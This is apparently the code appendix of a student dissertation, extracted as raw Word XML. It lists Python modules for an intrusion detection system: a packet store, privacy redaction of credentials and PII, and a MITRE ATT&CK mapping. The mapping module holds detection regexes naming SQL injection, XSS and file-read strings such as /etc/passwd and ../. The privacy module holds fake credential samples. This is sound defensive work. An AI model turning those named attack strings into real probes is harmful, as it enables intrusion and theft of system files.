    <w:p w14:paraId="1AA1C4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FB61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proto  - keep only this protocol (TCP/UDP/ICMP/OTHER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C601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query  - case-insensitive substring match on src, dst, info, verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4072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after  - only return packets with a sequence number greater than this</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766A5F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69EA21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561ABA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items = list(self._packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6D98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85D7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after:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EADB4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items = [p for p in items if p["no"] &gt; after]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49018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proto and proto != "ALL":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEFF6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proto = proto.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD211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items = [p for p in items if p.get("proto") == proto]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EDC8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query:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352D07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q = query.lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7956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items = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FE81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p for p in items</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B1C8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if q in str(p.get("src", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D63A6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or q in str(p.get("dst", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13044F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or q in str(p.get("info", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276935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or q in str(p.get("verdict", "")).lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A248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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37193E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87EC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items.reverse()  # newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7900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items[:limit]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0019E4E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6F1F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all_packets(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0BD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363B32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list(self._packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181EE61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6D57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top_talkers(self, n=5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C363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5FC866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pairs = sorted(self.talkers.items(), key=lambda kv: kv[1],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2622EC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reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DF2F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[{"ip": ip, "count": c} for ip, c in pairs[:n]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213880D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B498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stats_snapshot(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4AFD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3DE92E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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B3EB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"pps": self.pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526AB0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"mean": round(self.mean, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F792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"z_score": round(self.z_score, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B106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"ddos_candidate": self.ddos_candidate,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F43B6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"ddos_active": self.ddos_active,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C919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"buffered": len(self._packets),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D909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"total_seen": self.total_seen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755522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"capacity": self._packets.maxlen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1DC9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"proto_counts": dict(self.proto_counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B63C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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653FD41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B818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clear(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8900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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDDDB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self._packets.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794225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self._seq = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799E4C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self.total_seen = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DFF3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self.proto_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528069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self.talkers = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236990A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DE78C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CC7A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hexdump(raw, width=16):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477161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"""Wireshark-style offset / hex / ASCII dump of raw bytes."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A48C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lines = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC062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off in range(0, len(raw), width):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017E7E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chunk = raw[off:off + width]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD1EA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hex_part = " ".join("%02x" % b for b in chunk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C12FE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hex_part = hex_part.ljust(width * 3 - 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBEF9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ascii_part = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in chunk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7462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lines.append("%04x  %s  %s" % (off, hex_part, ascii_part))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F4C6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"\n".join(lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5466BD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7DC4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DCF5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now_hms():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BA7E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seconds + milliseconds, matches the packet timeline in the UI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678D5F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 = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3583EC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time.strftime("%H:%M:%S", time.localtime(t)) + (".%03d" % int((t % 1) * 1000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211503F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4581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851D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module-level singleton shared by the sensor (writer) and SIEM (reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC405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STORE = PacketStore()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5711DB00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src/utils/privacy.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630B811D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(128 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B652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02B79D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"""Privacy and data-minimisation controls for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5918C1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5C3FA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project proposal commits, under the Data Protection Act (2018) and GDPR,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A78AC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that "the packet sniffer is configured not to capture or store real world</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32879F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Personally Identifiable Information (PII)". NFR-3 refines this into two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1801F7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concrete engineering rules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8320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7E3D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payload excerpts persisted to disk are truncated to 64 bytes;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311C42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 identifiers may be anonymised before they reach any log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2427D9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D52A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This module enforces both. It is deliberately separate from the detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C71E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engines: the engines see the full payload in volatile memory so that</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD8E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detection accuracy is unaffected, but anything that is *persisted* (CSV audit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BB8E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log, UDP telemetry, HTML report, pcap export) passes through here first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5A87A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1400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Data minimisation applied here:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3475ED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1. length reduction   - truncate to configured excerpt size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1221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2. content redaction  - regex-replace credential/PII bearing tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718B83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3. pseudonymisation   - optional last-octet masking of IPv4 addresses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1053293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613F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6ABCE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6B75BF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312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re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE2E65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AB44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Ordered most-specific first so a card number is not partly eaten by the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3077E1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generic digit-run rule.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020AD8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_PII_RULES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752679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RFC 5322-ish email address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601A8B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(re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7565C3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"[EMAIL_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C08F8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13-16 digit payment card numbers, optional spaces/dashes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2BCC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(re.compile(r"\b(?:\d[ \-]?){13,16}\b"), "[CARD_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E63E6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password / passwd / pwd = value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4985AF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(re.compile(r"(?i)\b(pass(?:word|wd)?|pwd)\s*=\s*[^&amp;\s\"']+"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289DF7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r"\1=[REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1DDB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api keys, tokens, secrets, session ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478D6B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(re.compile(r"(?i)\b(api[_\-]?key|token|secret|session[_\-]?id|auth)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1763D6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r"\s*[=:]\s*[^&amp;\s\"']+"), r"\1=[REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2D2F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HTTP Authorization / Cookie headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C818C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(re.compile(r"(?i)(authorization|cookie|set-cookie)\s*:\s*[^\r\n]+"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F694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r"\1: [REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB1F2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UK National Insurance number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB6F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(re.compile(r"(?i)\b[A-Z]{2}\d{6}[A-D]\b"), "[NINO_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A21C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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373EA5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5FCA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EBA0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redact(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8B71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"""Replace PII / credential bearing substrings with fixed markers."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9053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text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E39D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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421283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pattern, replacement in _PII_RULES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3C1A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text = pattern.sub(replacement, text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC5A7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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C774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DBB0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0B69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payload_excerpt(payload, limit=64, privacy_mode=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D5D7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"""Return a short, log-safe printable excerpt of a raw payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C0A96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2E75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payload may be bytes or str. Non-printable bytes become '.' so the excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E701D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cannot smuggle ANSI escapes or control characters into a terminal or the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2F2CB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CSV audit log (log-injection defence).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D3F0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37D088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payload is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560418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""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761EB3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isinstance(payload, str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DE1B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raw = payload.encode("utf-8", errors="ignore")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC578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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAF50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raw = bytes(payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA0F85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642E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1. data minimisation: never keep more than the configured excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0751DE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clipped = raw[:max(0, int(limit))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC8FF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F3CE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2. make it printable and safe to write into a CSV cell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13411A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text = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in clipped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43973B3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C7B6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3. content redaction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B5E5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privacy_mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783057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text = redact(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71ACCF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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D909BB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B27B8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3A68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anonymise_ip(ip, enabled=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D90A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"""Mask the host portion of an IPv4 address (192.168.1.57 -&gt; 192.168.1.0).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556230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E281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Keeps the /24 network, which is all that is needed to correlate an attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36898C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source in an isolated lab, while removing the individual host identifier.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DC07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Mirrors the widely used IP-anonymisation approach in web analytics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7507BA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494D5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enabled or not ip:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD944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ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561EFD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parts = str(ip).split(".")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF46B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len(parts) == 4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D06D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".".join(parts[:3] + ["0"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1310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ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556EA83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3852C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CC35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truncate_hex(hex_string, limit_bytes=64):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1AD8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"""Clip a hex-encoded frame snapshot to limit_bytes worth of hex chars."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ECF4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hex_string:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726FDA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""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480D5A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hex_string[:max(0, int(limit_bytes)) * 2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43612C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05AB1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8131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apply(config, src_ip=None, payload=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6051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"""Convenience helper: apply the whole policy from a Config object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6332DFE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1C3E0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Returns (safe_ip, safe_excerpt).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428A80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5668E6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safe_ip = anonymise_ip(src_ip, getattr(config, "anonymise_ips", False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115470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safe_excerpt = payload_excerpt(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5D37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payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662E35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limit=getattr(config, "payload_excerpt_bytes", 64),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B9E7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privacy_mode=getattr(config, "privacy_mode", True),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EBF9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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D24C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safe_ip, safe_excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CDAB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2643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02A0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37D24B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samples = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A15A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b"GET /?user=bob@example.com&amp;password=hunter2 HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1C40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b"POST /pay card=4111 1111 1111 1111 api_key=sk_live_9932",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD892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b"Cookie: session_id=abcd1234; theme=dark",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B789F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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D936B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s in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8531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print(payload_excerpt(s, limit=64))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC2A2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print(anonymise_ip("192.168.1.57"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F26E5D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src/utils/mitre.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1780CC1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(207 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432159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716CCB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"""MITRE ATT&amp;CK enrichment and risk scoring for MANTIS alerts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C1FB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DD5C7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Chapter 2 contrasts MANTIS with commercial platforms such as Snort and Wazuh.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5BFE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 capability those platforms provide, and which a raw "DDoS DETECTED" string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3C0C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does not, is *threat framing*: telling the analyst which adversary technique</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AB71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observation corresponds to, so the alert can be triaged against a known</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332309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kill-chain rather than read in isolation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6223ADA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CADE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This module maps each MANTIS detection to its MITRE ATT&amp;CK Enterprise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB768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technique and tactic, and derives a bounded 0-10 risk score from the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293F6C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technique's base severity plus the engine's own confidence signal. The mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0144D2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is a static lookup table, so enrichment costs one dictionary hit per alert and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485D47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adds no measurable latency (preserving NFR-1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D96C0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50EC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Reference: MITRE ATT&amp;CK Enterprise Matrix v14 (attack.mitre.org).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9010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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C2B8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303F14A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082F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re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7816CD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E068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detection kind -&gt; ATT&amp;CK technique metadata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45259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TECHNIQUES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F76A1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"ddos": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150EF1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"T1498",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795F4E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"Network Denial of Service",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585C9F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"Impact",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746E07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"TA0040",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2488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"CRITICAL",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609101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8.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F831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"Z-Score (statistical)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9AE3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0A28E6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"scan": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E239A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"T1046",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F0E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"Network Service Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335D8D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"Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270FC2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"TA0007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2294D8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"MEDIUM",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434ED7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5.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AFAE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"KNN (behavioural)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C6A8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28300A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"sqli": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561131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"T1190",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAC19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"Exploit Public-Facing Application",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2166F1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"Initial Access",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053CDA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"TA0001",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9168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"HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077597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9.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4550C1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"Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461B08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1631B7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"xss": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4DF0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"T1059.007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2505AC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"Command and Scripting Interpreter: JavaScript",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BB47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"Execution",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA051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"TA0002",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6B13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"HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD4F6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7.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FF2F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"Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D13B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6CE465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"lfi": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110B75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"T1083",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAA61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"File and Directory Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4670B7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"Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3226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"TA0007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FED4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"HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463B8E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7.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CEB9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"Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A781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33231D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"payload": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652BBD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"T1190",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2302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"Exploit Public-Facing Application",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2B44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"Initial Access",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E8FF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"TA0001",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAF87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"HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF140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8.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3142C6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"Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D59C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42E2D6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"blacklist": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13500A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"T1071",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A6CC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"Application Layer Protocol (known-bad infrastructure)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A046A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"Command and Control",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3682AE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"TA0011",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6254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"HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5467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7.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A08AF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"Bloom Filter (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A51F6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155B4F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"anomaly": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1673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"T1071",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57640E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"Anomalous Traffic Profile (behavioural drift)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34849F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"Command and Control",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDB2B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"tactic_id": "TA0011",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1924C4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"MEDIUM",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3288EC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4.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F892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"K-Means (clustering)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6023D9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5A5EAA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"unknown": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CCD4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"id": "N/A",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B308A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"name": "Uncategorised Observation",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40319C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"Unknown",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3D09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"N/A",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2295C4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"INFO",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669BD6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"base_score": 1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0390BD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"n/a",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CC5A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},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B5BB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5AF078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482E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Specific payload families roll up to the "payload" category, so a policy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A388C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written as block_on=["payload"] covers sqli, xss and lfi without having to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567E40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enumerate every sub-family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447E73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KIND_GROUPS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422B7E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"sqli": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A077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"xss": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0C87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"lfi": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B925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"payload": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D62F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47F031F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B92E4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30AB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parent_kind(kind):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79270A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"""Return the policy group a detection kind belongs to."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D9E0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KIND_GROUPS.get(kind, kind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66759CC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0D604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327A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payload keyword -&gt; more specific attack family, checked before generic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2884EA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_PAYLOAD_FAMILIES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E17DF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(re.compile(r"(?i)UNION|SELECT|OR 1=1|SLEEP|DROP|INSERT|UPDATE"), "sqli"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D378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(re.compile(r"(?i)SCRIPT|ALERT\(|ONERROR|&lt;IMG"), "xss"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB5C9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(re.compile(r"(?i)/ETC/PASSWD|\.\./|/PROC/SELF"), "lfi"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C072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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FDF8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2AD6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85C8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classify_kind(message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677353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"""Infer the detection kind from a MANTIS alert string."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5FFF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not message:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DCB8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"unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558C56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upper = message.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EBFA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E2B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"DDOS" in upper or "Z-SCORE" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B768B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"ddos"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCA82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"SCAN" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D06FD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"scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7025E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"BLACKLIST" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799C85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"blacklist"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C2A3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"PAYLOAD" in upper or "MALICIOUS" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0B61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pattern, family in _PAYLOAD_FAMILIES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A19C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pattern.search(message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF20B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return family</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AA1F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"payload"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4081F7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"ANOMALY" in upper or "CLUSTER" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5511CB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"anomaly"</w:t>
